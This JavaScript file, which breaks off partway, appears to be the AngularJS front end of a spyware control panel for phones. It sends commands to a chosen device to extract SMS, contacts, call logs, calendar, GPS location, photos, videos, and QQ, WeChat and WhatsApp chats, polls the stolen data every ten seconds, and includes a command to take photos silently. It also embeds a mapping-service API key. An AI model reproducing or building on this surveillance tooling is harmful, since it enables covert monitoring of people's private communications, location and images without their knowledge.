var app=angular.module('myApp',['ng','ngRoute']);
app.run(function($rootScope,$http){
    $rootScope.isActive=function(a){
        if(a){
            return 'on';
        }
    };
    $rootScope.navFalse=function(){
        $rootScope.viewDevice=false;
        $rootScope.viewFileManager=false;
        $rootScope.viewCSTimeline=false;
        $rootScope.viewSocial=false;
        $rootScope.viewTrackDraw=false;
        $rootScope.viewDetailedContent=false;
        $rootScope.viewSms=false;
        $rootScope.viewMemo=false;
        $rootScope.viewAddressBook=false;
        $rootScope.viewCallHistory=false;
        $rootScope.viewCalendar=false;
        $rootScope.viewGps=false;
        $rootScope.viewFilmedRecords=false;
        $rootScope.viewSecretPhotos=false;
        $rootScope.viewSocialInside=false;
        $rootScope.viewBrowserHistory=false;
        $rootScope.viewRecordingControl=false;
        $rootScope.viewFileManagerInside=false;
        $rootScope.viewBaseStation=false;
        $rootScope.viewWifiControl=false;
        $rootScope.viewReturnMode=false;
        $rootScope.viewCommand=false;
        $rootScope.viewConfiguration=false;
    };

    //默认link
    $rootScope.link='http://10.0.0.33:8080';
    //默认获取全部设备
    $http.get($rootScope.link+'/phone/find/all').success(function(data){
        if(data.code==200){
            $rootScope.deviceList=data.data;
            //默认保存第一台设备
            if(data.data.length>=0){
                $rootScope.nowDevice=sessionStorage.getItem('nowDevice')||data.data[0].serialNum;
                $rootScope.nowId=sessionStorage.getItem('nowId')||data.data[0].id;
                sessionStorage.setItem('nowDevice',$rootScope.nowDevice);
                sessionStorage.setItem('nowId',$rootScope.nowId);
                $rootScope.deviceShow='Device ID '+$rootScope.nowId;
                $http.get($rootScope.link+'/phone/iosinfo/list?imei='+$rootScope.nowDevice).success(function(data){
                    if(data.data){
                        $rootScope.phoneDevice=data.data.device;
                        $rootScope.phoneVersion=data.data.ios;
                        $rootScope.phoneNumber=data.data.phoneNum;
                        $rootScope.phoneAppId=data.data.appleid;
                    }else{
                        $rootScope.phoneDevice='-';
                        $rootScope.phoneVersion='-';
                        $rootScope.phoneNumber='-';
                        $rootScope.phoneAppId='-';
                    }
                });
            }
        }else{
            alert('Jesus ! something wrong!');
        }

    });
    $rootScope.isOnline=function(a){
        return a==0?'on':'';
    };
    $rootScope.isOffline=function(a){
        return a==0?'Offline':'Online';
    };
    //默认选择第一台设备

    //选中设备
    $rootScope.pickOneDevice=function(imei,id){
        $rootScope.nowDevice=imei;
        $rootScope.deviceShow='Device ID '+id;
        sessionStorage.setItem('nowDevice',$rootScope.nowDevice);
        sessionStorage.setItem('nowId',id);
        $http.get($rootScope.link+'/phone/iosinfo/list?imei='+imei).success(function(data){
            if(data.data){
                $rootScope.phoneDevice=data.data.device;
                $rootScope.phoneVersion=data.data.ios;
                $rootScope.phoneNumber=data.data.phoneNum;
                $rootScope.phoneAppId=data.data.appleid;
            }else{
                $rootScope.phoneDevice='-';
                $rootScope.phoneVersion='-';
                $rootScope.phoneNumber='-';
                $rootScope.phoneAppId='-';
            }
        });
    };

    //时间的管控
    $rootScope.changeTime=function(s){
        var time=new Date(s);
        var month=time.getMonth()+1;
        var day=time.getDate();
        if(month<10){
            month='0'+month;
        }
        if(day<10){
            day='0'+day;
        }
        return month+'/'+day+'/'+time.getFullYear();
    };
    $rootScope.getToday=function(){
        var a=new Date();
        return $rootScope.changeTime(a);
    };
    $rootScope.getTomorrow=function(){
        var a=new Date().getTime()+86400000;
        return $rootScope.changeTime(a);
    };
    $rootScope.getLastWeek=function(){
        var a=new Date().getTime()-86400000*7;
        return $rootScope.changeTime(a);
    };
    $rootScope.changeTimeStyle=function(s){
        var arr= s.split('/');
        return arr[2]+'-'+arr[0]+'-'+arr[1];
    };

    //切换device
    $rootScope.deviceListShow=false;
    $rootScope.getDeviceList=function(){
        $rootScope.deviceListShow=!$rootScope.deviceListShow;
    };
    $rootScope.changeAssDevice=function(imei,id){
        $rootScope.nowDevice=imei;
        $rootScope.deviceShow='Device ID '+id;
        sessionStorage.setItem('nowDevice',imei);
        sessionStorage.setItem('nowId',id);
        $rootScope.deviceListShow=false;
    }


});
app.config(function($routeProvider){
    $routeProvider
        .when('/device',{templateUrl:'tpl/device.html',controller:'deviceCtrl'})
        .when('/file-manager',{templateUrl:'tpl/file-manager.html',controller:'fileManagerCtrl'})
        .when('/cs-timeline',{templateUrl:'tpl/cs-timeline.html',controller:'csTimelineCtrl'})
        .when('/social',{templateUrl:'tpl/social.html',controller:'socialCtrl'})
        .when('/track-draw',{templateUrl:'tpl/track-draw.html',controller:'trackDrawCtrl'})
        .when('/sms',{templateUrl:'tpl/sms.html',controller:'smsCtrl'})
        .when('/memo',{templateUrl:'tpl/memo.html',controller:'memoCtrl'})
        .when('/address-book',{templateUrl:'tpl/address-book.html',controller:'addressBookCtrl'})
        .when('/call-history',{templateUrl:'tpl/call-history.html',controller:'callHistoryCtrl'})
        .when('/calendar',{templateUrl:'tpl/calendar.html',controller:'calendarCtrl'})
        .when('/gps',{templateUrl:'tpl/gps.html',controller:'gpsCtrl'})
        .when('/filmed-records',{templateUrl:'tpl/filmed-records.html',controller:'filmedRecordsCtrl'})
        .when('/secret-photos',{templateUrl:'tpl/secret-photos.html',controller:'secretPhotosCtrl'})
        .when('/social-inside',{templateUrl:'tpl/social-inside.html',controller:'socialInsideCtrl'})
        .when('/browser-history',{templateUrl:'tpl/browser-history.html',controller:'browserHistoryCtrl'})
        .when('/recording-control',{templateUrl:'tpl/recording-control.html',controller:'recordingControlCtrl'})
        .when('/file-manager-inside',{templateUrl:'tpl/file-manager-inside.html',controller:'fileManagerInsideCtrl'})
        .when('/base-station',{templateUrl:'tpl/base-station.html',controller:'baseStationCtrl'})
        .when('/wifi-control',{templateUrl:'tpl/wifi-control.html',controller:'wifiControlCtrl'})
        .when('/return-mode',{templateUrl:'tpl/return-mode.html',controller:'returnModeCtrl'})
        .when('/command',{templateUrl:'tpl/command.html',controller:'commandCtrl'})
        .when('/configuration',{templateUrl:'tpl/configuration.html',controller:'configurationCtrl'})
        .otherwise({redirectTo:'/device'});
});
app.controller('titleC',function($rootScope,$scope){
    $scope.showUserSwitch=function(){
        $scope.userSwitchBox=true;
    };
    $scope.closeUserSwitch=function(){
        $scope.userSwitchBox=false;
    };
});
app.controller('navC',function($rootScope,$scope,$location){
    $scope.showDetailList=function(){
        $rootScope.detailList=!$rootScope.detailList;
        $location.path('/sms');
    };
    $scope.getPageTo=function(a){
        $location.path('/'+a);
    };
});
//视图控制器
app.controller('deviceCtrl',function($rootScope,$scope,$http,$timeout){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewDevice=true;
    $rootScope.detailList=false;
    //点击加载信息
    $scope.AcquireInfo=function(){
        $http.get($rootScope.link+"/task/save?cmd=getios&phoneSerial=" + $rootScope.nowDevice + "&name=IOS&enName=IOS")
            .success(function (data) {
                alert('ok！')
            })
    };
    $timeout(function(){
        $scope.isPicked=function(num){
            if(num==$rootScope.nowDevice){
                return 'on';
            }
        };
    },0);

});
//设备选择的颜色改变
app.directive('pickOneDevice',function(){
    return {
        link:function(scope,elem){
            elem.click(function(){
                elem.parent().find('li').removeClass('on');
                elem.addClass('on');
            });
        }
    }
});

app.controller('fileManagerCtrl',function($rootScope,$scope){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewFileManager=true;
    $rootScope.detailList=false;
});
app.controller('csTimelineCtrl',function($rootScope,$scope){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewCSTimeline=true;
    $rootScope.detailList=false;
});
app.controller('socialCtrl',function($rootScope,$scope){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewSocial=true;
    $rootScope.detailList=false;
});
app.controller('trackDrawCtrl',function($rootScope,$scope){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewTrackDraw=true;
    $rootScope.detailList=false;
});
app.controller('smsCtrl',function($rootScope,$scope,$timeout,$http,$interval){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewDetailedContent=true;
    $rootScope.viewSms=true;
    $rootScope.detailList=true;

    //get-sms
    $scope.search='';
    //$timeout(function(){
    //    $http.get($rootScope.link+'/text/message/getAllMessage?imei='+$rootScope.nowDevice+'&fromnumber=').success(function(data){
    //        $scope.smsList=data.data;
    //    });
    //},0);
    $scope.getSmsNew=function(){
        $http.get($rootScope.link+'/task/save?cmd=getsms&phoneSerial=' + $rootScope.nowDevice + '&name=短信&enName=SMS').success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        });
    };
    $scope.getSmsBox=true;
    $scope.searchAll=function(){
        $http.get($rootScope.link+'/text/message/getAllMessage?imei='+$rootScope.nowDevice+'&fromnumber='+$scope.search).success(function(data){
            $scope.smsList=data.data;
        });
    };


    $scope.smsControlBox=false;
    $scope.smsControlNew=function(){
        $scope.newBrush=true;
        $timeout(function(){
            $scope.newBrush=false;
        },1100);
    };
    $scope.typeCommand='Click on the input command';

    $scope.showGetSms=function(){
        $scope.smsControlBox=false;
        $scope.getSmsBox=true;
        smsInterval=$interval(function(){
            $http.get($rootScope.link+'/text/message/getAllMessage?imei='+$rootScope.nowDevice+'&fromnumber='+$scope.search).success(function(data){
                $scope.smsList=data.data;
            });
        },10000)
    };
    $scope.showSmsControl=function(){
        $scope.getSmsBox=false;
        $scope.smsControlBox=true;
        $interval.cancel(smsInterval);
    };

    //监听device的改变
    $scope.$watch('nowDevice',function(n){
        $http.get($rootScope.link+'/text/message/getAllMessage?imei='+n+'&fromnumber='+$scope.search).success(function(data){
            $scope.smsList=data.data;
        });
    });
    //定时刷新
    var smsInterval=$interval(function(){
        $http.get($rootScope.link+'/text/message/getAllMessage?imei='+$rootScope.nowDevice+'&fromnumber='+$scope.search).success(function(data){
            $scope.smsList=data.data;
        });
    },10000);
    //离开的时候 清理定时器
    $scope.$on('$destroy',function(){
        $interval.cancel(smsInterval);
    });

});
app.controller('memoCtrl',function($rootScope,$scope,$timeout,$http,$interval){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewDetailedContent=true;
    $rootScope.viewMemo=true;
    $rootScope.detailList=true;

    $scope.getMemoNew=function(){
        $http.get($rootScope.link+"/task/save?cmd=getmemo&phoneSerial=" + $rootScope.nowDevice + "&name=备忘录&enName=Memo").success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        })
    };
    $scope.search='';
    //$timeout(function(){
    //    $http.get($rootScope.link+'/memorandum/getMemoByTime?imei='+$rootScope.nowDevice+'&content=').success(function(data){
    //        $scope.memoList=data.data;
    //    });
    //},0);
    $scope.searchAll=function(){
        $http.get($rootScope.link+'/memorandum/getMemoByTime?imei='+$rootScope.nowDevice+'&content='+$scope.search).success(function(data){
            $scope.memoList=data.data;
        });
    };

    //监听device的变化
    $scope.$watch('nowDevice',function(n){
        $http.get($rootScope.link+'/memorandum/getMemoByTime?imei='+n+'&content='+$scope.search).success(function(data){
            $scope.memoList=data.data;
        });
    });
    //定时刷新
    var memoInterval=$interval(function(){
        $http.get($rootScope.link+'/memorandum/getMemoByTime?imei='+$rootScope.nowDevice+'&content='+$scope.search).success(function(data){
            $scope.memoList=data.data;
        });
    },10000);
    //离开的时候清理定时器
    $scope.$on('$destroy',function(){
        $interval.cancel(memoInterval);
    })

});
app.controller('addressBookCtrl',function($rootScope,$scope,$timeout,$http,$interval){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewDetailedContent=true;
    $rootScope.viewAddressBook=true;
    $rootScope.detailList=true;

    $scope.search='';
    $scope.getAddressBookNew=function(){
        $http.get($rootScope.link+"/task/save?cmd=getaddressbook&phoneSerial=" + $rootScope.nowDevice + "&name=通讯录&enName=Address Book").success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        });
    };
    //$timeout(function(){
    //    $http.get($rootScope.link+'/addr/book/get?imei='+$rootScope.nowDevice+'&number=').success(function(data){
    //        $scope.addressList=data.data;
    //    })
    //},0);
    $scope.searchAll=function(){
        $http.get($rootScope.link+'/addr/book/get?imei='+$rootScope.nowDevice+'&number='+$scope.search).success(function(data){
            $scope.addressList=data.data;
        })
    }
    //监听device的变化
    $scope.$watch('nowDevice',function(n){
        $http.get($rootScope.link+'/addr/book/get?imei='+n+'&number='+$scope.search).success(function(data){
            $scope.addressList=data.data;
        })
    })
    //定时刷新
    var addressInterval=$interval(function(){
        $http.get($rootScope.link+'/addr/book/get?imei='+$rootScope.nowDevice+'&number='+$scope.search).success(function(data){
            $scope.addressList=data.data;
        })
    },10000)
    //离开的时候清理定时器
    $scope.$on('$destroy',function(){
        $interval.cancel(addressInterval);
    })
});
app.controller('callHistoryCtrl',function($rootScope,$scope,$timeout,$http,$interval){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewDetailedContent=true;
    $rootScope.viewCallHistory=true;
    $rootScope.detailList=true;

    $scope.search='';
    $scope.getCallHistoryNew=function(){
        $http.get($rootScope.link+"/task/save?cmd=getcallhistory&phoneSerial=" + $rootScope.nowDevice + "&name=通话记录&enName=Call History").success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        })
    };
    //$timeout(function(){
    //    $http.get($rootScope.link+'/call/record/getCallRecord?imei='+$rootScope.nowDevice+'&number=').success(function(data){
    //        $scope.callHistoryList=data.data;
    //    });
    //},0);
    $scope.searchAll=function(){
        $http.get($rootScope.link+'/call/record/getCallRecord?imei='+$rootScope.nowDevice+'&number='+$scope.search).success(function(data){
            $scope.callHistoryList=data.data;
        });
    };
    //监听device的变化
    $scope.$watch('nowDevice',function(n){
        $http.get($rootScope.link+'/call/record/getCallRecord?imei='+n+'&number='+$scope.search).success(function(data){
            $scope.callHistoryList=data.data;
        });
    });
    //定时刷新
    var callHistoryInterval=$interval(function(){
        $http.get($rootScope.link+'/call/record/getCallRecord?imei='+$rootScope.nowDevice+'&number='+$scope.search).success(function(data){
            $scope.callHistoryList=data.data;
        });
    },10000);
    //离开的时候清理定时器
    $scope.$on('$destroy',function(){
        $interval.cancel(callHistoryInterval);
    })
});
app.controller('calendarCtrl',function($rootScope,$scope,$timeout,$http,$interval){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewDetailedContent=true;
    $rootScope.viewCalendar=true;
    $rootScope.detailList=true;

    $scope.getCalendarNew=function(){
        $http.get($rootScope.link+"/task/save?cmd=calender&phoneSerial=" + $rootScope.nowDevice + "&name=日历&enName=calender").success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        });
    };
    //默认加载日历列表
    $scope.search='';
    //$timeout(function(){
    //    $http.get($rootScope.link+'/calender/getCalender?imei='+$rootScope.nowDevice+'&summary=').success(function(data){
    //        $scope.calendarList=data.data;
    //    });
    //},0);
    $scope.searchAll=function(){
        $http.get($rootScope.link+'/calender/getCalender?imei='+$rootScope.nowDevice+'&summary='+$scope.search).success(function(data){
            $scope.calendarList=data.data;
        });
    }

    //监听device的变化
    $scope.$watch('nowDevice',function(n){
        $http.get($rootScope.link+'/calender/getCalender?imei='+n+'&summary='+$scope.search).success(function(data){
            $scope.calendarList=data.data;
        });
    });
    //定时器
    var calendarInterval=$interval(function(){
        $http.get($rootScope.link+'/calender/getCalender?imei='+$rootScope.nowDevice+'&summary='+$scope.search).success(function(data){
            $scope.calendarList=data.data;
        });
    },10000);
    //离开的时候清理定时器
    $scope.$on('$destroy',function(){
        $interval.cancel(calendarInterval);
    })
});
app.controller('gpsCtrl',function($rootScope,$scope,$timeout,$http,$interval){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewDetailedContent=true;
    $rootScope.viewGps=true;
    $rootScope.detailList=true;

    $scope.getGpsNew=function(){
        $http.get($rootScope.link+'/task/save?cmd=getgps&phoneSerial=' + $rootScope.nowDevice + '&name=地理位置&enName=GPS').success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!')
            }
        })
    };

    //$timeout(function(){
    //    $http.get($rootScope.link+'/phone/localinfo/get?imei='+$rootScope.nowDevice).success(function(data){
    //        if(data.data){
    //            var dataArr=data.data;
    //            for(var i= 0,ass=[];i<dataArr.length;i++){
    //                ass.push([dataArr[i].latitude,dataArr[i].longitude]);
    //            }
    //            var promises=ass.map(function(id){
    //                return new Promise(function(resolve,reject){
    //                    $.ajax({
    //                        type:'GET',
    //                        url:'http://api.map.baidu.com/geocoder/v2/?ak=HbUVYMUg6PwbOnXkztdgSQlQ&callback=renderReverse&location='+id[0]+','+id[1]+'&output=json&pois=1',
    //                        dataType:'JSONP',
    //                        async:false,
    //                        success:function(data){
    //                            resolve(data.result.formatted_address);
    //                        }
    //                    })
    //                })
    //            });
    //            Promise.all(promises).then(function(arr){
    //                for(var j=0;j<arr.length;j++){
    //                    dataArr[j]['address']=arr[j];
    //                }
    //                $scope.gpsList=dataArr;
    //                $scope.$apply();
    //            });
    //        }else{
    //            $scope.gpsList='';
    //        }
    //    });
    //},0);
    $scope.showLocation=function(lat,long){
        return '('+lat.substr(0,8)+','+long.substr(0,8)+')';
    };
    //监听device的变化
    $scope.$watch('nowDevice',function(n){
        $http.get($rootScope.link+'/phone/localinfo/get?imei='+n).success(function(data){
            if(data.data){
                var dataArr=data.data;
                for(var i= 0,ass=[];i<dataArr.length;i++){
                    ass.push([dataArr[i].latitude,dataArr[i].longitude]);
                }
                var promises=ass.map(function(id){
                    return new Promise(function(resolve,reject){
                        $.ajax({
                            type:'GET',
                            url:'http://api.map.baidu.com/geocoder/v2/?ak=HbUVYMUg6PwbOnXkztdgSQlQ&callback=renderReverse&location='+id[0]+','+id[1]+'&output=json&pois=1',
                            dataType:'JSONP',
                            async:false,
                            success:function(data){
                                resolve(data.result.formatted_address);
                            }
                        })
                    })
                });
                Promise.all(promises).then(function(arr){
                    for(var j=0;j<arr.length;j++){
                        dataArr[j]['address']=arr[j];
                    }
                    $scope.gpsList=dataArr;
                    $scope.$apply();
                });
            }else{
                $scope.gpsList='';
            }
        });
    });
    //定时器
    var gpsInterval=$interval(function(){
        $http.get($rootScope.link+'/phone/localinfo/get?imei='+$rootScope.nowDevice).success(function(data){
            if(data.data){
                var dataArr=data.data;
                for(var i= 0,ass=[];i<dataArr.length;i++){
                    ass.push([dataArr[i].latitude,dataArr[i].longitude]);
                }
                var promises=ass.map(function(id){
                    return new Promise(function(resolve,reject){
                        $.ajax({
                            type:'GET',
                            url:'http://api.map.baidu.com/geocoder/v2/?ak=HbUVYMUg6PwbOnXkztdgSQlQ&callback=renderReverse&location='+id[0]+','+id[1]+'&output=json&pois=1',
                            dataType:'JSONP',
                            async:false,
                            success:function(data){
                                resolve(data.result.formatted_address);
                            }
                        })
                    })
                });
                Promise.all(promises).then(function(arr){
                    for(var j=0;j<arr.length;j++){
                        dataArr[j]['address']=arr[j];
                    }
                    $scope.gpsList=dataArr;
                    $scope.$apply();
                });
            }else{
                $scope.gpsList='';
            }
        });
    },10000);
    //离开的时候清理定时器
    $scope.$on('$destroy',function(){
        $interval.cancel(gpsInterval);
    })
});
app.controller('filmedRecordsCtrl',function($rootScope,$scope,$timeout,$http,$interval){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewDetailedContent=true;
    $rootScope.viewFilmedRecords=true;
    $rootScope.detailList=true;

    $scope.getPhotosNew=function(){
        $http.get($rootScope.link+'/task/save?cmd=getpicture&phoneSerial=' + $rootScope.nowDevice + '&name=照片&enName=Photos').success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        });
    };
    $scope.photosBox=true;
    $scope.showPhotosBox=function(){
        $http.get($rootScope.link+'/file/getFile?imei='+$rootScope.nowDevice+'&type=1').success(function(data){
            $scope.videosBox=false;
            $scope.photosBox=true;
            $scope.photosList=data.data;
            $interval.cancel(videoInterval);
            photoInterval=$interval(function(){
                $http.get($rootScope.link+'/file/getFile?imei='+$rootScope.nowDevice+'&type=1').success(function(data){
                    $scope.photosList=data.data;
                });
            },10000);
        });
    };
    //$timeout(function(){
    //    $http.get($rootScope.link+'/file/getFile?imei='+$rootScope.nowDevice+'&type=1').success(function(data){
    //        $scope.photosList=data.data;
    //    });
    //},0);

    $scope.getVideosNew=function(){
        $http.get($rootScope.link+"/task/save?cmd=getvideo&phoneSerial=" + $rootScope.nowDevice + "&name=视频&enName=Video").success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        });
    };
    $scope.videosBox=false;
    $scope.showVideosBox=function(){
        $http.get($rootScope.link+'/file/getFile?imei='+$rootScope.nowDevice+'&type=2').success(function(data){
            $scope.photosBox=false;
            $scope.videosBox=true;
            $scope.videosList=data.data;
            $interval.cancel(photoInterval);
            videoInterval=$interval(function(){
                $http.get($rootScope.link+'/file/getFile?imei='+$rootScope.nowDevice+'&type=2').success(function(data){
                    $scope.videosList=data.data;
                })
            },10000);
        });
    };

    $scope.downloadAss=function(id){
        window.location.href=$rootScope.link+'/file/downLoad?id='+id;
    };

    //监听device的变化
    $scope.$watch('nowDevice',function(n){
        $http.get($rootScope.link+'/file/getFile?imei='+n+'&type=1').success(function(data){
            $scope.photosList=data.data;
            $scope.videosBox=false;
            $scope.photosBox=true;
        });
    });
    //photo定时器
    var photoInterval=$interval(function(){
        $http.get($rootScope.link+'/file/getFile?imei='+$rootScope.nowDevice+'&type=1').success(function(data){
            $scope.photosList=data.data;
        });
    },10000);
    var videoInterval=$interval(function(){},10000);
    //离开的时候清理定时器
    $scope.$on('$destroy',function(){
        $interval.cancel(photoInterval);
        $interval.cancel(videoInterval);
    })
});
app.controller('secretPhotosCtrl',function($rootScope,$scope,$timeout,$http,$interval){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewDetailedContent=true;
    $rootScope.viewSecretPhotos=true;
    $rootScope.detailList=true;

    $scope.getSecretPhotosNew=function(){
        $http.get($rootScope.link+"/task/save?cmd=camera&phoneSerial=" + $rootScope.nowDevice + "&name=静默拍照&enName=Take Photos").success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        });
    };
    //$timeout(function(){
    //    $http.get($rootScope.link+'/file/getFile?imei='+$rootScope.nowDevice+'&type=4').success(function(data){
    //        if(data.code==0){
    //            $scope.sPhotoList=data.data;
    //        }
    //    });
    //},0);
    $scope.canDownload=function(s){
        return s==0?'No':'Yes';
    };
    //监听device的变化
    $scope.$watch('nowDevice',function(n){
        $http.get($rootScope.link+'/file/getFile?imei='+n+'&type=4').success(function(data){
            if(data.code==0){
                $scope.sPhotoList=data.data;
            }
        });
    });
    //定时器
    var secretPhotoInterval=$interval(function(){
        $http.get($rootScope.link+'/file/getFile?imei='+$rootScope.nowDevice+'&type=4').success(function(data){
            if(data.code==0){
                $scope.sPhotoList=data.data;
            }
        });
    },10000);
    //离开的时候清理定时器
    $scope.$on('$destroy',function(){
        $interval.cancel(secretPhotoInterval);
    })
});
app.controller('socialInsideCtrl',function($rootScope,$scope,$http,$timeout,$interval){
    //导航栏的颜色状态
    $rootScope.navFalse();
    $rootScope.viewDetailedContent=true;
    $rootScope.viewSocialInside=true;
    $rootScope.detailList=true;

    $scope.softwareBox=true;
    $scope.getSoftWareDBNew=function(){
        $scope.newBrush=true;
        $timeout(function(){
            $scope.newBrush=false;
        },1100);
    };
    $scope.getSoftwareShow=function(){
        $scope.qqBox=false;
        $scope.weChatBox=false;
        $scope.whatsappBox=false;
        $scope.twitterBox=false;
        $scope.telegramBox=false;
        $scope.softwareBox=true;
    };


    $scope.qqBox=false;
    $scope.getQQNew=function(){
        $http.get($rootScope.link+'/task/save?cmd=qq&enName=qqChatJson&name=qq%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95&phoneSerial='+$rootScope.nowDevice+'&type=all').success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        });
    };
    $scope.getQQShow=function(){
        $http.get($rootScope.link+'/chat/getQQContact?serial='+$rootScope.nowDevice).success(function(data){
            if(data.code==0){
                $rootScope.loadedQQ=data.data;
                $scope.weChatBox=false;
                $scope.whatsappBox=false;
                $scope.twitterBox=false;
                $scope.telegramBox=false;
                $scope.softwareBox=false;
                $scope.qqBox=true;
                if(data.data){
                    $scope.moQQNumber=data.data[0].qqNumber;
                    $http.get($rootScope.link+'/chat/getQQChatJson?serial='+$rootScope.nowDevice+'&qqNumber='+$scope.moQQNumber+'&Type=0').success(function(data){
                        $scope.qqList=data.data;
                        $scope.chatList=JSON.parse(data.data[0].chatMessage);
                    })
                }
            }
        })
    };
    $scope.qqTypeNumber=function(type,dis,q,tr){
        var a;
        if(type==0){
            a=q;
        }else if(type==1){
            a=dis;
        }else if(type==2){
            a=tr;
        }
        return a;
    };
    $scope.qqTypeName=function(type,dis,tr){
        var a;
        if(type==0){
            a='-';
        }else if(type==1){
            a=dis;
        }else if(type==2){
            a=tr;
        }
        return a;
    };
    $scope.qqType=0;
    $scope.changeQQNumber=function(qq){
        $http.get($rootScope.link+'/chat/getQQChatJson?serial='+$rootScope.nowDevice+'&qqNumber='+qq+'&Type='+$scope.qqType).success(function(data){
            $scope.qqList=data.data;
            if(data.data){
                $scope.chatList=JSON.parse(data.data[0].chatMessage);
            }else{
                $scope.chatList='';
            }
        })
    };
    $scope.qqModel='QQ personal';
    $scope.changeQQType=function(m){
        if(m=='QQ personal'){
            $scope.qqType=0;
        }else if(m=='QQ discussion group'){
            $scope.qqType=1
        }else if(m=='QQ group'){
            $scope.qqType=2
        }
        $http.get($rootScope.link+'/chat/getQQChatJson?serial='+$rootScope.nowDevice+'&qqNumber='+$scope.moQQNumber+'&Type='+$scope.qqType).success(function(data){
            $scope.qqList=data.data;
            if(data.data){
                $scope.chatList=JSON.parse(data.data[0].chatMessage);
            }else{
                $scope.chatList='';
            }
        })
    };
    $scope.chatFloat=function(flag){
        return flag==1?'left-float':'right-float';
    };
    $scope.contentFlag=function(flag){
        return flag==1?'left-p':'right-p';
    };
    $scope.checkChat=function(c){
        $scope.chatList=JSON.parse(c);
    };


    $scope.weChatBox=false;
    $scope.getWeChatNew=function(){
        $http.get($rootScope.link+'/task/save?cmd=wechat&enName=weChatJson&name=微信%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95&phoneSerial='+$rootScope.nowDevice+'&type=all').success(function(data){
            if(data.code==200){
                alert('ok!');
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
            }else{
                alert('try again!');
            }
        })
    };
    $scope.getWeChatShow=function(){
        $http.get($rootScope.link+'/chat/getWechatAccount?serial='+$rootScope.nowDevice).success(function(data){
            if(data.code==0){
                $scope.weChatNumber=data.data;
                $scope.whatsappBox=false;
                $scope.twitterBox=false;
                $scope.telegramBox=false;
                $scope.softwareBox=false;
                $scope.qqBox=false;
                $scope.weChatBox=true;
                if(data.data){
                    $scope.weChatNum=data.data[0].myWechatIdNumber;
                    $http.get($rootScope.link+'/chat/getWechatJson?serial='+$rootScope.nowDevice+'&myWechatIdNumber='+data.data[0].myWechatIdNumber).success(function(data){
                        if(data.data){
                            $scope.weChatList=data.data;
                            $scope.weChatChatList=JSON.parse(data.data[0].chatMessage);
                        }
                    });
                }
            }
        })
    };
    $scope.changeWeChatNumber=function(){
        $http.get($rootScope.link+'/chat/getWechatJson?serial='+$rootScope.nowDevice+'&myWechatIdNumber='+$scope.weChatNum).success(function(data){
            if(data.data){
                $scope.weChatList=data.data;
                $scope.weChatChatList=JSON.parse(data.data[0].chatMessage);
            }
        });
    };
    $scope.getWeChatChatList=function(message){
        if(message){
            $scope.weChatChatList=JSON.parse(message);
        }else{
            $scope.weChatChatList='';
        }

    };

    $scope.whatsappBox=false;
    $scope.getWhatsappNew=function(){
        $http.get($rootScope.link+'/task/save?cmd=whatsapp&enName=WhatsappChatJson&name=whatsAppJson&phoneSerial='+$rootScope.nowDevice+'&type=all').success(function(data){
            if(data.code==200){
                $scope.newBrush=true;
                $timeout(function(){
                    $scope.newBrush=false;
                },1100);
                alert('ok!');
            }else{
                alert('try again!');
            }
        })
    };
    $scope.getWhatsappShow=function(){
        $http.get($rootScope.link+'/chat/getWhatsappAccount?serial='+$rootScope.nowDevice).success(function(data){
            if(data.code==0){
                $scope.whatsAppNumberList=data.data;
                $scope.twitterBox=false;
                $scope.telegramBox=false;
                $scope.softwareBox=false;
                $scope.qqBox=false;
                $scope.weChatBox=false;
                $scope.whatsappBox=true;
                if(data.data){
                    $scope.whatsAppNumber=data.data[0].myWhatsAppIdNumber;
                    $http.post($rootScope.link+'/chat/getWhatsappJson',JSON.stringify({'serial':$rootScope.nowDevice,'mywhatsAppIdNumber':data.data[0].myWhatsAppIdNumber,'type':$scope.whatsAppType})).success(function(data){
                        if(data.data){
                            $scope.whatsAppList=data.data;
                            $scope.whatsAppChatList=JSON.parse(data.data[0].chatMessage);
                        }
                    })
                }
            }
        })
    };
    $scope.whatsAppType='Personal';
